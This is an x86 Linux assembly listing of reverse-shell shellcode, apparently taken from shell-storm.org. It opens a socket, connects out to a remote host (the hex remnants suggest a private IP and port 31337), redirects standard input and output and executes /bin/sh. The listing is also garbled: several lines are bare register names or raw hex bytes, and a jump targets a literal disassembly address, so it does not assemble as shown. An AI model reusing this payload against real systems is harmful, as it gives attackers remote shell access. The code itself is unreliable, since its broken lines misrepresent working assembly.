; http://shell-storm.org/shellcode/files/shellcode-849.php
; Reverse shell

section .text

	global _start

_start:

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov al,0x66
	mov bl,0x1
	ecx 
	push 0x6
	push 0x1
	push 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax
	mov al,0x66
	xor ebx,ebx
	mov bl,0x2
	a8 01
	7a 69
	push bx
	inc bl
	mov ecx,esp
	push 0x10
	ecx 
	esi 
	mov ecx,esp
	int 0x80
	xor ecx,ecx
	mov cl,0x3

dupfd:

	dec cl
	mov al,0x3f
	int 0x80
	jne 804809a
	xor eax,eax
	edx 
	2f 73
	2f 62
	mov ebx,esp
	edx 
	ebx 
	mov ecx,esp
	edx 
	mov edx,esp
	mov al,0xb
	int 0x80